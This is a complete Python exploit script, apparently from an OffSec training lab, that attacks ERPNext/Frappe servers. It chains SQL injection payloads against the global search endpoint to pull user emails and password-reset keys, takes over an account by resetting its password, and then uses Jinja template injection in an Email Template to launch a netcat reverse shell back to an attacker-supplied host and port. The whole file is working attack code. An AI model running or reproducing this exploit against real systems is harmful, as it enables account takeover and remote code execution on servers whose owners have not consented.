import requests
import argparse
import re
import json

def getEmail(url):
    """
    Send a request to the given URL and extract an email address from the response.
    
    Args:
        url (str): The URL to send the request to
        text (str): Text parameter for the request
        scope (str): Scope parameter for the request
        
    Returns:
        str: Extracted email address or error message
    """

    # Injection parameters
    text='offsec'
    scope='offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#'

    # Set up the cookies, headers, and data for the request
    cookies = {
        "full_name": "Guest",
        "user_id": "Guest",
        "system_user": "yes",
        "sid": "Guest",
        "user_image": ""
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Frappe-CSRF-Token": "None",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Origin": url.rstrip('/'),
        "Referer": url,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.utils.global_search.web_search",
        "text": text,
        "scope": scope
    }
    
    # Send the request
    try:
        res = requests.post(url, headers=headers, cookies=cookies, data=data)
        res.raise_for_status()  # Raise an exception for HTTP errors
        
        # Extract email from the response
        return extract_email(res.text)
        
    except requests.exceptions.RequestException as e:
        return f"Error sending request: {e}"

def extract_email(response_text):
    """
    Extract email address from the response text.
    
    Args:
        response_text (str): The response text to search for emails
        
    Returns:
        str: First found email or message indicating no email was found
    """
    try:
        # Try to parse as JSON first
        response_json = json.loads(response_text)
        # Search for email in the JSON response
        text_to_search = str(response_json)
    except json.JSONDecodeError:
        # If it's not JSON, search the raw text
        text_to_search = response_text
    
    # Regular expression to find email addresses
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    emails = re.findall(email_pattern, text_to_search)
    
    return emails[0] if emails else "No email found"

def resetPassword(url, email):
    """
    Send a password reset request for the specified email.
    
    Args:
        email (str): The email address to reset the password for
        url (str, optional): The URL of the server. Defaults to "http://erpnext:8000/".
        
    Returns:
        requests.Response: The response object from the request
    """
    cookies = {
        "sid": "Guest", 
        "system_user": "yes", 
        "user_image": "", 
        "user_id": "Guest", 
        "full_name": "Guest"
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.core.doctype.user.user.reset_password", 
        "user": email
    }
    
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    return response

def extractToken(url):
    """
    Extract token and email information from the specified URL.
    
    Args:
        url (str): The URL to send the request to. Defaults to "http://erpnext:8000/".
        
    Returns:
        dict: A dictionary containing 'email' and 'route' information if found
    """
    cookies = {
        "full_name": "Guest", 
        "user_id": "Guest", 
        "system_user": "yes", 
        "sid": "Guest", 
        "user_image": ""
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.utils.global_search.web_search", 
        "text": "offsec", 
        "scope": 'offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#'
    }
    
    # Send the request
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    result = {
        "email": None,
        "route": None
    }
    
    
    response_data = json.loads(response.text)
    return response_data["message"][2]["route"]

def resetPass(url, token, password):
    """
    Reset a user password using a reset key.
    
    Args:
        key (str): The password reset key
        new_password (str): The new password to set
        url (str, optional): The URL of the server. Defaults to "http://erpnext:8000/".
        
    Returns:
        requests.Response: The response object from the request
    """
    cookies = {
        "sid": "Guest", 
        "system_user": "yes", 
        "user_image": "", 
        "user_id": "Guest", 
        "full_name": "Guest"
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "key": token, 
        "old_password": '', 
        "new_password": password, 
        "cmd": "frappe.core.doctype.user.user.update_password"
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    return response

def login(url, usr, pwd):
    """
    Login to the ERPNext system.
    
    Args:
        url (str): The URL of the ERPNext server
        usr (str): The username/email to login with
        pwd (str): The password for the account
        
    Returns:
        requests.Session: The session object with login cookies
    """
    session = requests.session()
    
    cookies = {
        "system_user": "yes", 
        "user_image": "", 
        "user_id": "Guest", 
        "sid": "Guest", 
        "full_name": "Guest"
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "login", 
        "usr": usr, 
        "pwd": pwd, 
        "device": "desktop"
    }
    
    response = session.post(url, headers=headers, cookies=cookies, data=data)
    
    return session

def findSubclass(url, session=None):
    """
    Attempt to locate the index of the subprocess.Popen subclass.
    
    Args:
        url (str): The URL of the ERPNext server
        session (requests.Session, optional): Session object for authenticated requests.
            If None, a new session will be created.
            
    Returns:
        int: The index of the subprocess.Popen subclass if found, None otherwise
    """
    print("[+] Attempting to locate subclass index...")
    
    # Use provided session or create a new one
    s = session if session else requests.session()
    
    # Get CSRF token for authenticated requests
    try:
        resp = s.get(f"{url}/app")
        csrf_token = None
        match = re.search(r'csrf_token\s*=\s*"([^"]+)"', resp.text)
        if match:
            csrf_token = match.group(1)
            print(f"[+] Found CSRF token: {csrf_token}")
    except Exception as e:
        print(f"[!] Error getting CSRF token: {e}")
        csrf_token = "None"  # Default fallback
    
    # Creating template
    target = f"{url}/api/method/frappe.desk.form.save.savedocs"
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Frappe-CSRF-Token": csrf_token
    }
    
    # Using a simpler payload for template creation
    template_data = {
        "doc": json.dumps({
            "docstatus": 0,
            "doctype": "Email Template",
            "name": "New Email Template 1",
            "__islocal": 1,
            "__unsaved": 1,
            "owner": "Administrator",
            "__newname": "SSTI",
            "subject": "SSTI",
            "response": "<div>{% set string = \"ssti\" %}</div>" +
                      "<div>{% set class = \"__class__\" %}</div>" +
                      "<div>{% set mro = \"__mro__\" %}</div>" +
                      "<div>{% set subclasses = \"__subclasses__\" %}</div>" +
                      "<div>{% set mro_r = string|attr(class)|attr(mro) %}</div>" +
                      "<div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div>" +
                      "<div>{{ subclasses_r }}</div>"
        }),
        "action": "Save"
    }
    
    # Convert to form data
    form_data = "&".join([f"{k}={requests.utils.quote(v)}" for k, v in template_data.items()])
    
    # Create the template
    create_response = s.post(target, data=form_data, headers=headers)
    if create_response.status_code != 200:
        print(f"[!] Failed to create template: {create_response.status_code}")
        print(create_response.text)
        return None
    
    # Calling created template to fetch subclasses
    target = f"{url}/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
    data = {
        "template_name": "SSTI",
        "doc": "{}",
        "_lang": ""
    }
    req = s.post(target, data=data, headers=headers)
    
    try:
        data = json.loads(req.text)
        if 'message' not in data or 'message' not in data['message']:
            print(f"[!] Unexpected response format: {data}")
            return None
            
        subclasses = data['message']['message']
        
        # Look for subprocess.Popen in the list
        sub = subclasses.split(', ')
        for index, line in enumerate(sub):
            if 'subprocess.Popen' in line:
                print(f"[+] {line} found at index {index}")
                
                # Deleting template
                target = f"{url}/api/method/frappe.client.delete"
                data = {
                    "doctype": "Email Template",
                    "name": "SSTI"
                }
                s.post(target, data=data, headers=headers)
                
                return index
                
        print("[!] subprocess.Popen class not found in subclasses list")
        print(f"[*] Available classes: {subclasses[:500]}...")  # Show sample of classes
        
    except (json.JSONDecodeError, KeyError) as e:
        print(f"[!] Error parsing response: {e}")
        print(f"[*] Raw response: {req.text[:500]}...")  # Show part of response
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    
    # Cleanup in case of failure
    try:
        target = f"{url}/api/method/frappe.client.delete"
        data = {"doctype": "Email Template", "name": "SSTI"}
        s.post(target, data=data, headers=headers)
    except:
        pass
        
    return None

def rce(url, popen_index, lhost, lport, session=None):
    """
    Execute remote code by exploiting a server-side template injection vulnerability.
    
    Args:
        url (str): The URL of the ERPNext server
        popen_index (int): The index of the subprocess.Popen class in __subclasses__
        lhost (str): IP address of your listening host
        lport (str): Port of your listening host
        session (requests.Session, optional): Session object for authenticated requests.
            If None, a new session will be created.
            
    Returns:
        bool: True if the RCE payload was successfully triggered, False otherwise
    """
    print("[+] Attempting to trigger RCE payload...")
    
    # Use provided session or create a new one
    s = session if session else requests.session()
    
    # Get CSRF token for authenticated requests
    try:
        resp = s.get(f"{url}/app")
        csrf_token = None
        match = re.search(r'csrf_token\s*=\s*"([^"]+)"', resp.text)
        if match:
            csrf_token = match.group(1)
            print(f"[+] Found CSRF token: {csrf_token}")
    except Exception as e:
        print(f"[!] Error getting CSRF token: {e}")
        csrf_token = "None"  # Default fallback
    
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Frappe-CSRF-Token": csrf_token
    }
    
    # Create a simpler reverse shell command
    # Using netcat as an alternative to socat for wider compatibility
    reverse_shell_cmd = f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

    # Creating RCE template
    target = f"{url}/api/method/frappe.desk.form.save.savedocs"
    
    template_data = {
        "doc": json.dumps({
            "docstatus": 0,
            "doctype": "Email Template",
            "name": "New Email Template 1",
            "__islocal": 1,
            "__unsaved": 1,
            "owner": "Administrator",
            "__newname": "RCE",
            "subject": "RCE",
            "response": "<div>{% set string = \"ssti\" %}</div>" +
                      "<div>{% set class = \"__class__\" %}</div>" +
                      "<div>{% set mro = \"__mro__\" %}</div>" +
                      "<div>{% set subclasses = \"__subclasses__\" %}</div>" +
                      "<div>{% set mro_r = string|attr(class)|attr(mro) %}</div>" +
                      "<div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div>" +
                      f"<div>{{{{ subclasses_r[{popen_index}](['bash', '-c', '{reverse_shell_cmd}']) }}}}</div>"
        }),
        "action": "Save"
    }
    
    # Convert to form data
    form_data = "&".join([f"{k}={requests.utils.quote(v)}" for k, v in template_data.items()])
    
    # Create the template
    create_response = s.post(target, data=form_data, headers=headers)
    if create_response.status_code != 200:
        print(f"[!] Failed to create RCE template: {create_response.status_code}")
        print(create_response.text)
        return False

    print("[+] RCE template created successfully")
    print(f"[+] Reverse shell command: {reverse_shell_cmd}")
    print(f"[+] Make sure you have a listener running on {lhost}:{lport}")
    print("[+] Triggering the payload...")
    
    # Triggering the template to execute the payload
    target = f"{url}/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
    data = {
        "template_name": "RCE",
        "doc": "{}",
        "_lang": ""
    }
    
    try:
        # Use a longer timeout as the reverse shell connection might take a moment
        req = s.post(target, data=data, headers=headers, timeout=10)
        res = req.text
        
        # Check if response contains evidence of successful execution
        match = re.search(r'subprocess\.Popen object at 0x[0-9a-fA-F]+', res)
        if match:
            print(f"[+] RCE successful: {match.group(0)}")
            print(f"[+] Reverse shell should be connecting to {lhost}:{lport}")
            
            # Cleanup - delete the RCE template
            try:
                target = f"{url}/api/method/frappe.client.delete"
                data = {"doctype": "Email Template", "name": "RCE"}
                s.post(target, data=data, headers=headers)
            except:
                pass
                
            return True
        else:
            print("[!] RCE response doesn't contain expected Popen object reference")
            print(f"[*] Response preview: {res[:500]}...")  # Show part of response
            
            # Still might be successful if the command executed
            print("[*] Check your listener - the reverse shell might still be connecting")
            
    except requests.exceptions.Timeout:
        print("[*] Request timed out - this could be good! Check your listener")
        print("[*] If the reverse shell worked, the request might have hung")
        return True
    except Exception as e:
        print(f"[!] Error triggering RCE: {e}")
    
    # Cleanup in case of failure
    try:
        target = f"{url}/api/method/frappe.client.delete"
        data = {"doctype": "Email Template", "name": "RCE"}
        s.post(target, data=data, headers=headers)
    except:
        pass
        
    return False
    
def main():
    """
    Main function to parse command-line arguments and exploit the vulnerable application.
    """
    # Set up argument parser
    parser = argparse.ArgumentParser(description='Exploit ERPNext vulnerabilities - SQL injection, password reset, and RCE.')
    parser.add_argument('--url', help='The URL to send the request to (e.g., http://target:8000/)', required=True)
    parser.add_argument('--lhost', help='IP address for reverse shell connection', required=False)
    parser.add_argument('--lport', help='Port for reverse shell connection', required=False)
    parser.add_argument('--rce-only', action='store_true', help='Skip auth and only perform RCE (requires --lhost and --lport)')
    
    args = parser.parse_args()
    url = args.url.rstrip('/')
    
    session = None
    
    if not args.rce_only:
        # Call getEmail with the provided arguments
        email = getEmail(url)
        print(f"[+] Found email: {email}")

        # Reset password
        res = resetPassword(url, email)
        if res.status_code == 200:
            print("[+] Password reset initialized")

        # Get reset token
        token = extractToken(url)
        print(f"[+] Password reset token: {token}")

        # Reset password
        newPass = "NewPassword12345$"
        res = resetPass(url, token, newPass)
        if res.status_code == 200:
            print(f"[+] Password for {email} reset to {newPass}")
        
        # Login with new credentials
        session = login(url, email, newPass)
        print("[+] Successfully authenticated")
    
    # If lhost and lport are provided, attempt RCE
    if args.lhost and args.lport:
        if not session and not args.rce_only:
            print("[!] No valid session and --rce-only not specified. RCE might fail.")
            
        popen_index = findSubclass(url, session)
        if popen_index is not None:
            rce(url, popen_index, args.lhost, args.lport, session)
        else:
            print("[!] Failed to find subprocess.Popen index, cannot proceed with RCE")
    elif not args.rce_only:
        print("[*] No RCE attempted - provide --lhost and --lport to attempt RCE")
    else:
        print("[!] Error: --rce-only specified but missing --lhost and/or --lport")
    
if __name__ == "__main__":
    main()